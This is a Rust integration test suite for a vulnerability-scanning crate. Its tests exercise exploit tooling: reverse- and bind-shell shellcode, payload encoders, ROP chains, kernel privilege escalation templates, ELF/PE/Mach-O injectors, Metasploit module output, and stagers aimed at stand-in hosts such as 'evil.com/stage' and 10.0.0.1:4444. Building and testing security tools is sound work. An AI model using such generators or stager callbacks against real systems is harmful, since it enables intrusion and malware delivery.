use std::path::{Path, PathBuf};
use vulnscan::{
    Finding, Language, ScanConfig, ScanResult, Severity,
    exploit::{
        self, Architecture, PayloadFormat, ShellcodeType, StagerType, TargetOs,
    },
    kernel::{
        fuzz,
        kconfig::KernelConfig,
        version::KernelVersion,
    },
    llm_analyst,
    report,
};

// ═══════════════════════════════════════════════════════════════════
// 1. Finding lifecycle (creation → enrichment → report)
// ═══════════════════════════════════════════════════════════════════

#[test]
fn finding_lifecycle_create_and_enrich() {
    let finding = Finding::new(
        Severity::High,
        "buffer overflow in parse_input",
        Some(PathBuf::from("src/parser.c")),
        Some(42),
        Some("int parse_input(char *buf) {{ ... }}".to_string()),
        Some("Use bounded copy".to_string()),
        Some("CWE-120".to_string()),
        0.85,
        vulnscan::DiscoveryMethod::StaticPatternMatching,
    );
    assert_eq!(finding.severity, Severity::High);
    assert_eq!(finding.cwe, Some("CWE-120".to_string()));
    assert_eq!(finding.line_number, Some(42));
    assert!(!finding.id.is_empty());

    let enriched = finding
        .with_cvss(8.5)
        .with_exploit("shellcode here".to_string(), vulnscan::ExploitType::RemoteCodeExecution);
    assert_eq!(enriched.cvss_score, Some(8.5));
    assert!(enriched.exploit_code.is_some());
    assert_eq!(
        enriched.exploit_type,
        Some(vulnscan::ExploitType::RemoteCodeExecution)
    );
}

#[test]
fn finding_severity_ranking() {
    let critical = Finding::new(
        Severity::Critical, "rce", None, None, None, None,
        None, 0.99, vulnscan::DiscoveryMethod::StaticPatternMatching,
    );
    let low = Finding::new(
        Severity::Low, "info", None, None, None, None,
        None, 0.3, vulnscan::DiscoveryMethod::StaticPatternMatching,
    );
    assert!(critical.severity.value() > low.severity.value());
}

#[test]
fn finding_disclosure_hash() {
    let finding = Finding::info("test disclosure", None, None, vulnscan::DiscoveryMethod::StaticPatternMatching);
    assert!(!finding.disclosed);
    let disclosed = finding.disclose("commit-abc123".to_string());
    assert!(disclosed.disclosed);
    assert!(disclosed.disclosure_hash.is_some());
}

// ═══════════════════════════════════════════════════════════════════
// 2. ScanConfig and ScanResult
// ═══════════════════════════════════════════════════════════════════

#[test]
fn scan_config_default_values() {
    let config = ScanConfig::default();
    assert!(config.enable_llm_agent);
}

#[test]
fn scan_result_creation() {
    let result = ScanResult::new(vec![], 0, 100);
    assert!(result.findings.is_empty());
    assert_eq!(result.files_scanned, 0);
}

#[test]
fn scan_result_with_findings() {
    let findings = vec![
        Finding::new(
            Severity::High, "vuln1", None, None, None, None,
            None, 0.8, vulnscan::DiscoveryMethod::StaticPatternMatching,
        ),
        Finding::new(
            Severity::Critical, "vuln2", None, None, None, None,
            None, 0.95, vulnscan::DiscoveryMethod::StaticPatternMatching,
        ),
    ];
    let result = ScanResult::new(findings, 50, 1000);
    assert_eq!(result.total_findings, 2);
    assert_eq!(result.critical_count, 1);
    assert_eq!(result.high_count, 1);
}

// ═══════════════════════════════════════════════════════════════════
// 3. Exploit multi-arch shellcode
// ═══════════════════════════════════════════════════════════════════

#[test]
fn exploit_shellcode_all_architectures_execve() {
    let combos = vec![
        (ShellcodeType::ExecveBinSh, Architecture::X64, TargetOs::Linux),
        (ShellcodeType::ExecveBinSh, Architecture::X86, TargetOs::Linux),
        (ShellcodeType::ExecveBinSh, Architecture::Arm, TargetOs::Linux),
        (ShellcodeType::ExecveBinSh, Architecture::Arm64, TargetOs::Linux),
        (ShellcodeType::ExecveBinSh, Architecture::X64, TargetOs::Windows),
        (ShellcodeType::ExecveBinSh, Architecture::X64, TargetOs::Macos),
    ];
    for (sc_type, arch, os) in combos {
        let sc = exploit::shellcode(sc_type, arch, os);
        assert!(!sc.is_empty(), "shellcode empty for {:?}/{:?}", arch, os);
    }
}

#[test]
fn exploit_shellcode_reverse_shell_all_architectures() {
    let combos = vec![
        (Architecture::X64, TargetOs::Linux),
        (Architecture::X86, TargetOs::Linux),
        (Architecture::Arm, TargetOs::Linux),
        (Architecture::Arm64, TargetOs::Linux),
        (Architecture::X64, TargetOs::Windows),
        (Architecture::X86, TargetOs::Windows),
    ];
    for (arch, os) in combos {
        let sc = exploit::shellcode(ShellcodeType::ReverseShell, arch, os);
        assert!(!sc.is_empty(), "reverse shell empty for {:?}/{:?}", arch, os);
    }
}

#[test]
fn exploit_shellcode_bind_shell_all_architectures() {
    let combos = vec![
        (Architecture::X64, TargetOs::Linux),
        (Architecture::X86, TargetOs::Linux),
        (Architecture::Arm, TargetOs::Linux),
        (Architecture::Arm64, TargetOs::Linux),
        (Architecture::X64, TargetOs::Windows),
        (Architecture::X86, TargetOs::Windows),
    ];
    for (arch, os) in combos {
        let sc = exploit::shellcode(ShellcodeType::BindShell, arch, os);
        assert!(!sc.is_empty(), "bind shell empty for {:?}/{:?}", arch, os);
    }
}

// ═══════════════════════════════════════════════════════════════════
// 4. Exploit payload generation end-to-end
// ═══════════════════════════════════════════════════════════════════

#[test]
fn exploit_reverse_shell_payload_all_architectures() {
    let combos = vec![
        (Architecture::X64, TargetOs::Linux),
        (Architecture::X86, TargetOs::Linux),
        (Architecture::Arm, TargetOs::Linux),
        (Architecture::Arm64, TargetOs::Linux),
        (Architecture::X64, TargetOs::Windows),
        (Architecture::X86, TargetOs::Windows),
    ];
    for (arch, os) in combos {
        let asm = exploit::reverse_shell_payload("10.0.0.1", 4444, arch, os);
        assert!(asm.contains("10.0.0.1"), "missing IP for {:?}/{:?}", arch, os);
        assert!(asm.contains("4444"), "missing port for {:?}/{:?}", arch, os);
    }
}

#[test]
fn exploit_bind_shell_payload_all_architectures() {
    let combos = vec![
        (Architecture::X64, TargetOs::Linux),
        (Architecture::X86, TargetOs::Linux),
        (Architecture::Arm, TargetOs::Linux),
        (Architecture::Arm64, TargetOs::Linux),
        (Architecture::X64, TargetOs::Windows),
        (Architecture::X86, TargetOs::Windows),
    ];
    for (arch, os) in combos {
        let asm = exploit::bind_shell_payload(9999, arch, os);
        assert!(asm.contains("9999"), "missing port for {:?}/{:?}", arch, os);
    }
}

// ═══════════════════════════════════════════════════════════════════
// 5. Encoding pipeline
// ═══════════════════════════════════════════════════════════════════

#[test]
fn exploit_encode_all_formats() {
    let sc = exploit::shellcode(ShellcodeType::ExecveBinSh, Architecture::X64, TargetOs::Linux);
    let formats = vec![
        PayloadFormat::Raw,
        PayloadFormat::Hex,
        PayloadFormat::Base64,
        PayloadFormat::Alphanumeric,
        PayloadFormat::SingleByteXor(0x42),
    ];
    for fmt in formats {
        let encoded = exploit::encode_payload(&sc, fmt);
        assert!(!encoded.is_empty());
    }
}

#[test]
fn exploit_xor_decoder_roundtrip() {
    let payload = vec![0x41, 0x42, 0x43, 0x44];
    let key = 0xFFu8;
    let encoded: Vec<u8> = payload.iter().map(|b| b ^ key).collect();
    let decoded: Vec<u8> = encoded.iter().map(|b| b ^ key).collect();
    assert_eq!(decoded, payload);
}

#[test]
fn exploit_shellcode_hex_format() {
    let sc = vec![0xDE, 0xAD, 0xBE, 0xEF];
    let hex = exploit::shellcode_to_hex(&sc);
    assert_eq!(hex, "\\xde\\xad\\xbe\\xef");
}

#[test]
fn exploit_shellcode_c_array_format() {
    let sc = vec![0x90, 0xCC];
    let c_arr = exploit::shellcode_to_c_array(&sc);
    assert!(c_arr.contains("0x90"));
    assert!(c_arr.contains("0xcc"));
    assert!(c_arr.starts_with("unsigned char shellcode[]"));
}

#[test]
fn exploit_shellcode_python_format() {
    let sc = vec![0x90, 0xCC];
    let py = exploit::shellcode_to_python(&sc);
    assert!(py.starts_with("shellcode = b\""));
    assert!(py.contains("\\x90\\xcc"));
}

// ═══════════════════════════════════════════════════════════════════
// 6. ROP chain generation
// ═══════════════════════════════════════════════════════════════════

#[test]
fn rop_chain_all_architectures() {
    for arch in [Architecture::X64, Architecture::X86, Architecture::Arm, Architecture::Arm64] {
        let gadgets = exploit::rop_chain_templates(arch);
        assert!(!gadgets.is_empty(), "no gadgets for {:?}", arch);
    }
}

#[test]
fn rop_chain_build_x64() {
    let chain = exploit::build_rop_chain(Architecture::X64, 0x400000, &[1, 2, 3]);
    assert!(chain.contains("pop rdi"));
    assert!(chain.contains("pop rsi"));
    assert!(chain.contains("pop rdx"));
    assert!(chain.contains("0x400000"));
}

#[test]
fn rop_chain_build_x86() {
    let chain = exploit::build_rop_chain(Architecture::X86, 0x8048000, &[0x10, 0x20]);
    assert!(chain.contains("pop ebx"));
    assert!(chain.contains("pop ecx"));
}

#[test]
fn kernel_rop_chain() {
    let rop = exploit::kernel_commit_creds_rop();
    assert!(rop.contains("commit_creds"));
    assert!(rop.contains("prepare_kernel_cred"));
    assert!(rop.contains("swapgs"));
    assert!(rop.contains("iretq"));
}

#[test]
fn kernel_shellcode_bytes() {
    let sc = exploit::kernel_shellcode();
    assert!(!sc.is_empty());
    assert!(sc.len() > 20);
}

#[test]
fn kernel_modprobe_path() {
    let kmod = exploit::kernel_modprobe_path_exploit();
    assert!(kmod.contains("modprobe_path"));
    assert!(kmod.contains("/proc/sys/kernel/modprobe_path"));
}

#[test]
fn kernel_core_pattern() {
    let cp = exploit::kernel_core_pattern_exploit();
    assert!(cp.contains("core_pattern"));
    assert!(cp.contains("/proc/sys/kernel/core_pattern"));
}

// ═══════════════════════════════════════════════════════════════════
// 7. Injector generation
// ═══════════════════════════════════════════════════════════════════

#[test]
fn elf_injector_with_shellcode() {
    let sc = exploit::shellcode(ShellcodeType::ExecveBinSh, Architecture::X64, TargetOs::Linux);
    let injector = exploit::generate_elf_injector(&sc);
    assert!(injector.contains("ELF Injection"));
    assert!(injector.contains("PT_NOTE"));
}

#[test]
fn pe_injector_with_shellcode() {
    let sc = vec![0x90; 16];
    let injector = exploit::generate_pe_injector(&sc);
    assert!(injector.contains("PE Injection"));
    assert!(injector.contains("code cave"));
}

#[test]
fn macho_injector_with_shellcode() {
    let sc = vec![0xCC; 8];
    let injector = exploit::generate_macho_injector(&sc);
    assert!(injector.contains("MachO Injection"));
    assert!(injector.contains("LC_LOAD_DYLIB"));
}

// ═══════════════════════════════════════════════════════════════════
// 8. Metasploit module generation
// ═══════════════════════════════════════════════════════════════════

#[test]
fn msf_module_full_config() {
    let config = exploit::MsfModuleConfig {
        name: "Test Exploit".to_string(),
        description: "A test exploit for integration testing".to_string(),
        author: "Kraken Test".to_string(),
        cve: Some("CVE-2025-9999".to_string()),
        cwe: Some("CWE-120".to_string()),
        platform: "linux".to_string(),
        arch: "x64".to_string(),
        rank: "good".to_string(),
        targets: vec!["Linux x64".to_string()],
        payload_type: "linux/x64/meterpreter/reverse_tcp".to_string(),
    };
    let module = exploit::generate_msf_module(&config);
    assert!(module.contains("Test Exploit"));
    assert!(module.contains("CVE-2025-9999"));
    assert!(module.contains("GOOD"));
    assert!(module.contains("def check"));
    assert!(module.contains("def exploit"));
    assert!(!module.contains("TODO"));
}

#[test]
fn msf_module_from_finding() {
    let finding = Finding::new(
        Severity::Critical,
        "remote code execution via buffer overflow",
        Some(PathBuf::from("src/vuln.c")),
        Some(100),
        None,
        None,
        Some("CWE-120".to_string()),
        0.95,
        vulnscan::DiscoveryMethod::StaticPatternMatching,
    );
    let module = exploit::ExploitGenerator::generate_msf_module_from_finding(&finding);
    assert!(module.is_some());
    let module = module.unwrap();
    assert!(module.contains("MetasploitModule"));
    assert!(module.contains("EXCELLENT"));
}

// ═══════════════════════════════════════════════════════════════════
// 9. ExploitGenerator integration with Findings
// ═══════════════════════════════════════════════════════════════════

#[test]
fn exploit_gen_rop_chain_high_severity() {
    let finding = Finding::new(
        Severity::High,
        "stack buffer overflow",
        Some(PathBuf::from("src/parser.c")),
        Some(42),
        None, None, Some("CWE-121".to_string()),
        0.9, vulnscan::DiscoveryMethod::StaticPatternMatching,
    );
    let rop = exploit::ExploitGenerator::generate_rop_chain(&finding);
    assert!(rop.is_some());
    assert!(rop.unwrap().contains("pop rdi"));
}

#[test]
fn exploit_gen_rop_chain_low_severity_returns_none() {
    let finding = Finding::info("minor issue", None, None, vulnscan::DiscoveryMethod::StaticPatternMatching);
    assert!(exploit::ExploitGenerator::generate_rop_chain(&finding).is_none());
}

#[test]
fn exploit_gen_heap_spray() {
    let finding = Finding::new(
        Severity::High,
        "use after free in parser",
        None, None, None, None,
        Some("CWE-416".to_string()),
        0.9, vulnscan::DiscoveryMethod::StaticPatternMatching,
    );
    let spray = exploit::ExploitGenerator::generate_heap_spray(&finding);
    assert!(spray.is_some());
    assert!(spray.unwrap().contains("JIT Heap Spray"));
}

#[test]
fn exploit_gen_privilege_escalation_critical() {
    let finding = Finding::new(
        Severity::Critical,
        "kernel privilege escalation via UAF",
        None, None, None, None,
        Some("CWE-269".to_string()),
        0.95, vulnscan::DiscoveryMethod::StaticPatternMatching,
    );
    let privesc = exploit::ExploitGenerator::generate_privilege_escalation(&finding);
    assert!(privesc.is_some());
    assert!(privesc.unwrap().contains("Privilege Escalation"));
}

#[test]
fn exploit_gen_shellcode_linux() {
    let finding = Finding::new(
        Severity::High,
        "buffer overflow",
        Some(PathBuf::from("arch/x86/kernel/vuln.c")),
        None, None, None,
        Some("CWE-120".to_string()),
        0.9, vulnscan::DiscoveryMethod::StaticPatternMatching,
    );
    let sc = exploit::ExploitGenerator::generate_shellcode(&finding, "linux");
    assert!(sc.is_some());
    assert!(sc.unwrap().contains("Shellcode"));
}

#[test]
fn exploit_gen_reverse_shell() {
    let finding = Finding::new(
        Severity::Critical,
        "remote code execution",
        None, None, None, None,
        Some("CWE-94".to_string()),
        0.9, vulnscan::DiscoveryMethod::StaticPatternMatching,
    );
    let rs = exploit::ExploitGenerator::generate_reverse_shell(&finding, "10.0.0.1", 4444);
    assert!(rs.is_some());
    assert!(rs.unwrap().contains("10.0.0.1"));
}

#[test]
fn exploit_gen_bind_shell() {
    let finding = Finding::new(
        Severity::Critical,
        "remote code execution",
        None, None, None, None,
        Some("CWE-94".to_string()),
        0.9, vulnscan::DiscoveryMethod::StaticPatternMatching,
    );
    let bs = exploit::ExploitGenerator::generate_bind_shell(&finding, 4444);
    assert!(bs.is_some());
    assert!(bs.unwrap().contains("4444"));
}

#[test]
fn exploit_gen_kernel_exploit_from_finding() {
    let finding = Finding::new(
        Severity::Critical,
        "use after free in kernel driver modprobe_path",
        Some(PathBuf::from("drivers/char/vuln.c")),
        Some(200),
        None, None,
        Some("CWE-416".to_string()),
        0.95, vulnscan::DiscoveryMethod::StaticPatternMatching,
    );
    let kexp = exploit::ExploitGenerator::generate_kernel_exploit(&finding);
    assert!(kexp.is_some());
    let code = kexp.unwrap();
    assert!(code.contains("commit_creds"));
    assert!(code.contains("modprobe_path"));
}

#[test]
fn exploit_gen_poc_kernel() {
    let finding = Finding::new(
        Severity::Critical,
        "use after free in kernel netfilter",
        Some(PathBuf::from("net/netfilter/vuln.c")),
        None, None, None,
        Some("CWE-416".to_string()),
        0.9, vulnscan::DiscoveryMethod::StaticPatternMatching,
    );
    let poc = exploit::ExploitGenerator::generate_poc(&finding);
    assert!(poc.is_some());
}

#[test]
fn exploit_gen_poc_userspace() {
    let finding = Finding::new(
        Severity::High,
        "buffer overflow in web parser",
        Some(PathBuf::from("src/web/parser.c")),
        None, None, None,
        Some("CWE-120".to_string()),
        0.9, vulnscan::DiscoveryMethod::StaticPatternMatching,
    );
    let poc = exploit::ExploitGenerator::generate_poc(&finding);
    assert!(poc.is_some());
}

// ═══════════════════════════════════════════════════════════════════
// 10. Staged payloads
// ═══════════════════════════════════════════════════════════════════

#[test]
fn stager_all_types() {
    for stager in [StagerType::Http, StagerType::Tcp, StagerType::Dns] {
        let payload = exploit::generate_stager(stager, "http://callback.example.com");
        assert!(!payload.is_empty());
    }
}

#[test]
fn stage_generation() {
    let stage = exploit::generate_stage("exec", b"\x90\xcc");
    assert!(stage.starts_with(b"STAGE:exec:"));
    assert!(stage.ends_with(b"\x90\xcc"));
}

#[test]
fn http_stager_asm() {
    let asm = exploit::generate_http_stager_asm("http://evil.com/stage");
    assert!(asm.contains("evil.com/stage"));
    assert!(asm.contains("BITS 64"));
}

// ═══════════════════════════════════════════════════════════════════
// 11. Validation
// ═══════════════════════════════════════════════════════════════════

#[test]
fn validate_exploit_clean() {
    let result = exploit::validate_exploit("192.168.1.1:22", "normal exploit code");
    assert!(!result.success || result.output.contains("not reachable"));
}

#[test]
fn validate_exploit_with_placeholders() {
    let result = exploit::validate_exploit("1.2.3.4:80", "TODO: implement REPLACE_ME here");
    assert!(!result.success);
    assert!(result.output.contains("TODO") || result.output.contains("not reachable"));
}

// ═══════════════════════════════════════════════════════════════════
// 12. create_exploit_finding lifecycle
// ═══════════════════════════════════════════════════════════════════

#[test]
fn create_exploit_finding_preserves_base() {
    let base = Finding::new(
        Severity::High,
        "heap overflow",
        Some(PathBuf::from("vuln.c")),
        Some(10),
        Some("char buf[64];".to_string()),
        Some("use strlcpy".to_string()),
        Some("CWE-122".to_string()),
        0.85,
        vulnscan::DiscoveryMethod::StaticPatternMatching,
    );
    let exploit_finding = exploit::create_exploit_finding(
        &base,
        "exploit code here".to_string(),
        vulnscan::ExploitType::HeapSpray,
    );
    assert!(exploit_finding.description.contains("[EXPLOIT]"));
    assert!(exploit_finding.description.contains("heap overflow"));
    assert_eq!(exploit_finding.cwe, Some("CWE-122".to_string()));
    assert_eq!(exploit_finding.file_path, Some(PathBuf::from("vuln.c")));
    assert_eq!(exploit_finding.line_number, Some(10));
    assert!(exploit_finding.chained_findings.contains(&base.id));
    assert_eq!(exploit_finding.exploit_type, Some(vulnscan::ExploitType::HeapSpray));
}

// ═══════════════════════════════════════════════════════════════════
// 13. Language detection
// ═══════════════════════════════════════════════════════════════════

#[test]
fn language_extensions() {
    assert!(Language::C.extensions().contains(&"c"));
    assert!(Language::Rust.extensions().contains(&"rs"));
    assert!(Language::Python.extensions().contains(&"py"));
}

// ═══════════════════════════════════════════════════════════════════
// 14. FuzzGuide
// ═══════════════════════════════════════════════════════════════════

#[test]
fn fuzz_guide_targets() {
    let content = "fn main() { unsafe { ptr.write(0); } }\nfn parse() { return 1; }";
    let targets = vulnscan::fuzz::FuzzGuide::suggest_targets(content, Path::new("src/main.rs"), Language::Rust);
    assert!(!targets.is_empty());
}

#[test]
fn fuzz_guide_generate_target() {
    let template = vulnscan::fuzz::FuzzGuide::generate_fuzz_target(
        Path::new("src/parser.rs"),
        "parse_input",
    );
    assert!(template.contains("parse_input"));
    assert!(template.contains("fuzz_target"));
    assert!(template.contains("#![no_main]"));
    assert!(template.contains("cargo fuzz"));
    assert!(!template.contains("TODO"));
}

// ═══════════════════════════════════════════════════════════════════
// 15. Report generation
// ═══════════════════════════════════════════════════════════════════

#[test]
fn report_json_generation() {
    let findings = vec![
        Finding::new(
            Severity::Critical,
            "remote code execution",
            Some(PathBuf::from("vuln.c")),
            Some(10),
            None, None,
            Some("CWE-94".to_string()),
            0.95,
            vulnscan::DiscoveryMethod::StaticPatternMatching,
        ),
        Finding::new(
            Severity::Medium,
            "info disclosure",
            None, None, None, None,
            Some("CWE-200".to_string()),
            0.7,
            vulnscan::DiscoveryMethod::StaticPatternMatching,
        ),
    ];
    let json = report::generate_json_report(&findings);
    assert!(json.contains("remote code execution"));
    assert!(json.contains("info disclosure"));
}

#[test]
fn report_json_empty() {
    let json = report::generate_json_report(&[]);
    assert!(json.contains("[]"));
}

// ═══════════════════════════════════════════════════════════════════
// 16. Kernel version parsing
// ═══════════════════════════════════════════════════════════════════

#[test]
fn kernel_version_parse_full() {
    let ver = KernelVersion::parse_full("5.15.0-generic");
    assert!(ver.is_some());
    let ver = ver.unwrap();
    assert_eq!(ver.major, 5);
    assert_eq!(ver.minor, 15);
    assert_eq!(ver.patch, 0);
}

#[test]
fn kernel_version_parse_with_extra() {
    let ver = KernelVersion::parse_full("6.1.0-rc1");
    assert!(ver.is_some());
    let ver = ver.unwrap();
    assert_eq!(ver.major, 6);
    assert_eq!(ver.minor, 1);
    assert!(ver.extra.is_some());
}

// ═══════════════════════════════════════════════════════════════════
// 17. XOR decoder all architectures
// ═══════════════════════════════════════════════════════════════════

#[test]
fn xor_decoder_all_architectures() {
    for arch in [Architecture::X64, Architecture::X86, Architecture::Arm, Architecture::Arm64] {
        let stub = exploit::xor_decoder_stub(arch, 0x42, 32);
        assert!(!stub.is_empty(), "empty XOR decoder for {:?}", arch);
        assert!(stub.len() > 8, "XOR decoder too short for {:?}", arch);
    }
}

// ═══════════════════════════════════════════════════════════════════
// 18. Cross-module: Finding → Exploit → Report pipeline
// ═══════════════════════════════════════════════════════════════════

#[test]
fn pipeline_finding_to_exploit_to_report() {
    let finding = Finding::new(
        Severity::Critical,
        "kernel UAF in netfilter conntrack",
        Some(PathBuf::from("net/netfilter/nf_conntrack_core.c")),
        Some(500),
        Some("kfree(skb->data); ... skb->data->len".to_string()),
        Some("Hold reference until done".to_string()),
        Some("CWE-416".to_string()),
        0.95,
        vulnscan::DiscoveryMethod::StaticPatternMatching,
    );

    let exploit_code = exploit::ExploitGenerator::generate_poc(&finding);
    assert!(exploit_code.is_some());

    let exploit_finding = exploit::create_exploit_finding(
        &finding,
        exploit_code.unwrap(),
        vulnscan::ExploitType::PrivilegeEscalation,
    );

    let report = report::generate_json_report(&[exploit_finding]);
    assert!(report.contains("[EXPLOIT]"));
    assert!(report.contains("CWE-416"));
}

#[test]
fn pipeline_multiple_findings_report() {
    let findings: Vec<Finding> = (0..10)
        .map(|i| {
            Finding::new(
                if i % 3 == 0 { Severity::Critical } else if i % 2 == 0 { Severity::High } else { Severity::Medium },
                format!("vulnerability #{}", i),
                Some(PathBuf::from(format!("src/vuln_{}.c", i))),
                Some(i * 10),
                None, None,
                Some(format!("CWE-{}", 120 + i)),
                0.5 + (i as f32 * 0.05),
                vulnscan::DiscoveryMethod::StaticPatternMatching,
            )
        })
        .collect();

    let report = report::generate_json_report(&findings);
    for i in 0..10 {
        assert!(report.contains(&format!("vulnerability #{}", i)));
    }
}

// ═══════════════════════════════════════════════════════════════════
// 19. Severity classification
// ═══════════════════════════════════════════════════════════════════

#[test]
fn severity_ordering() {
    assert!(Severity::Critical.value() > Severity::High.value());
    assert!(Severity::High.value() > Severity::Medium.value());
    assert!(Severity::Medium.value() > Severity::Low.value());
    assert!(Severity::Low.value() > Severity::Info.value());
}

#[test]
fn severity_from_str_all_variants() {
    assert_eq!(Severity::from_str("critical"), Severity::Critical);
    assert_eq!(Severity::from_str("high"), Severity::High);
    assert_eq!(Severity::from_str("medium"), Severity::Medium);
    assert_eq!(Severity::from_str("low"), Severity::Low);
    assert_eq!(Severity::from_str("info"), Severity::Info);
    assert_eq!(Severity::from_str("unknown"), Severity::Info);
}

#[test]
fn severity_debug_format() {
    assert_eq!(format!("{:?}", Severity::Critical), "Critical");
    assert_eq!(format!("{:?}", Severity::High), "High");
}

// ═══════════════════════════════════════════════════════════════════
// 20. Fuzz minimizer
// ═══════════════════════════════════════════════════════════════════

#[test]
fn minimizer_reduces_input() {
    let crash_input = b"AAAA\x00\x00\x00\x00BBBB";
    let minimized = fuzz::minimize_input(crash_input, |data| {
        data.windows(4).any(|w| w == b"AAAA")
    }, 100);
    assert!(minimized.len() <= crash_input.len());
}

#[test]
fn minimizer_preserves_crash() {
    let crash_input = b"AAAA";
    let minimized = fuzz::minimize_input(crash_input, |data| {
        data.windows(4).any(|w| w == b"AAAA")
    }, 100);
    assert!(minimized.windows(4).any(|w| w == b"AAAA"));
}

// ═══════════════════════════════════════════════════════════════════
// 21. LLM analyst class matching
// ═══════════════════════════════════════════════════════════════════

#[test]
fn llm_class_matching_cwe() {
    let finding = Finding::new(
        Severity::High, "sql injection", None, None, None, None,
        Some("CWE-89".to_string()), 0.9, vulnscan::DiscoveryMethod::StaticPatternMatching,
    );
    let class = llm_analyst::class_for_finding(&finding);
    assert!(!class.is_empty());
}

#[test]
fn llm_class_matching_kernel_cwes() {
    let kernel_cwes = vec!["CWE-787", "CWE-362", "CWE-667", "CWE-416", "CWE-415"];
    for cwe in kernel_cwes {
        let finding = Finding::new(
            Severity::High, "kernel vuln",
            Some(PathBuf::from("drivers/vuln.c")),
            None, None, None,
            Some(cwe.to_string()), 0.9, vulnscan::DiscoveryMethod::StaticPatternMatching,
        );
        let class = llm_analyst::class_for_finding(&finding);
        assert!(!class.is_empty(), "no LLM class for {}", cwe);
    }
}

// ═══════════════════════════════════════════════════════════════════
// 22. Kernel config parsing
// ═══════════════════════════════════════════════════════════════════

#[test]
fn kernel_config_parse() {
    let config_content = "CONFIG_KASLR=y\nCONFIG_SMAP=y\nCONFIG_SMEP=y\n# CONFIG_DEBUG_INFO is not set\n";
    let config = KernelConfig::parse(config_content, Path::new("/proc/config.gz"));
    assert!(config.is_enabled("CONFIG_KASLR"));
    assert!(config.is_enabled("CONFIG_SMAP"));
    assert!(!config.is_enabled("CONFIG_DEBUG_INFO"));
}

// ═══════════════════════════════════════════════════════════════════
// 23. Hypothesis generation
// ═══════════════════════════════════════════════════════════════════

#[test]
fn hypothesis_generation_from_findings() {
    let findings = vec![
        Finding::new(
            Severity::High,
            "sql injection in login endpoint",
            Some(PathBuf::from("src/parser.c")),
            Some(50),
            None, None,
            Some("CWE-89".to_string()),
            0.85,
            vulnscan::DiscoveryMethod::StaticPatternMatching,
        ),
    ];
    let hypotheses = vulnscan::hypothesis::HypothesisGenerator::generate_from_findings(&findings);
    assert!(!hypotheses.is_empty());
}

// ═══════════════════════════════════════════════════════════════════
// 24. Finding ID uniqueness
// ═══════════════════════════════════════════════════════════════════

#[test]
fn finding_ids_are_unique() {
    let ids: Vec<String> = (0..100)
        .map(|_| vulnscan::new_finding_id())
        .collect();
    let unique: std::collections::HashSet<&str> = ids.iter().map(|s| s.as_str()).collect();
    assert_eq!(unique.len(), 100);
}

// ═══════════════════════════════════════════════════════════════════
// 25. Chaining
// ═══════════════════════════════════════════════════════════════════

#[test]
fn chaining_find_chains_empty() {
    let chains = vulnscan::VulnerabilityChainer::find_chains(&[]);
    assert!(chains.is_empty());
}

#[test]
fn chaining_find_chains_single_finding() {
    let finding = Finding::new(
        Severity::High, "test vuln", None, None, None, None,
        None, 0.8, vulnscan::DiscoveryMethod::StaticPatternMatching,
    );
    let chains = vulnscan::VulnerabilityChainer::find_chains(&[finding]);
    assert!(chains.is_empty());
}

// ═══════════════════════════════════════════════════════════════════
// 26. Mitigation checker
// ═══════════════════════════════════════════════════════════════════

#[test]
fn mitigation_checker_cargo_toml() {
    let findings = vulnscan::mitigation::MitigationChecker::check_cargo_toml(
        "[package]\nname = \"test\"\nversion = \"0.1.0\"\n",
        Path::new("Cargo.toml"),
    );
    assert!(!findings.is_empty());
}

#[test]
fn mitigation_checker_makefile() {
    let findings = vulnscan::mitigation::MitigationChecker::check_makefile(
        "CC=gcc\nCFLAGS=-Wall\nall: main\n",
        Path::new("Makefile"),
    );
    assert!(!findings.is_empty());
}
